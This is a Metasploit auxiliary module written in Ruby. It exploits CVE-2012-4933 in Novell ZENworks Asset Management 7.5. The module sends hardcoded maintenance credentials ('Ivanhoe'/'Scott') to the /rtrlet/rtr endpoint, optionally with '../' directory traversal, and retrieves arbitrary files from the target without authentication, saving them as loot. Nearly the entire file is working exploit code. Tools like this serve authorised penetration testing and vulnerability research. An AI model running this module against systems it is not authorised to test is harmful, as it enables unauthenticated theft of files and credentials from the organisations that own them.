##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Novell ZENworks Asset Management 7.5 Remote File Access',
      'Description'    => %q{
          This module exploits a hardcoded user and password for the GetFile maintenance
        task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web
        Console and can be triggered by sending a specially crafted request to the rtrlet component,
        allowing a remote unauthenticated user to retrieve a maximum of 100_000_000 KB of
        remote files. This module has been successfully tested on Novell ZENworks Asset
        Management 7.5.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'juan vazquez' # Also the discoverer
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4933' ],
          [ 'URL', 'https://blog.rapid7.com/2012/10/11/cve-2012-4933-novell-zenworks' ]				]
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptBool.new('ABSOLUTE', [ true, 'Use an absolute file path or directory traversal relative to the tomcat home', true ]),
        OptString.new('FILEPATH', [true, 'The name of the file to download', 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts']),
        OptInt.new('DEPTH', [false, 'Traversal depth if absolute is set to false', 1])
      ])
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("Please supply the name of the file you want to download")
      return
    end

    post_data = "kb=100000000&"
    if datastore['ABSOLUTE']
      post_data << "file=#{datastore['FILEPATH']}&"
      post_data << "absolute=yes&"
    else
      travs = "../" * (datastore['DEPTH'] || 1)
      travs << "/" unless datastore['FILEPATH'][0] == "\\" or datastore['FILEPATH'][0] == "/"
      travs << datastore['FILEPATH']
      post_data << "file=#{travs}&"
      post_data << "absolute=no&"
    end
    post_data << "maintenance=GetFile_password&username=Ivanhoe&password=Scott&send=Submit"

    print_status("#{rhost}:#{rport} - Sending request...")
    res = send_request_cgi({
      'uri'          => '/rtrlet/rtr',
      'method'       => 'POST',
      'data'         => post_data,
    }, 5)

    if res and res.code == 200 and res.body =~ /Last 100000000 kilobytes of/ and res.body =~ /File name/ and not res.body =~ /<br\/>File not found.<br\/>/
      print_good("#{rhost}:#{rport} - File retrieved successfully!")
      start_contents = res.body.index("<pre>") + 7
      end_contents = res.body.rindex("</pre>") - 1
      if start_contents.nil? or end_contents.nil?
        print_error("#{rhost}:#{rport} - Error reading file contents")
        return
      end
      contents = res.body[start_contents..end_contents]
      fname = File.basename(datastore['FILEPATH'])
      path = store_loot(
        'novell.zenworks_asset_management',
        'application/octet-stream',
        ip,
        contents,
        fname
      )
      print_status("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end
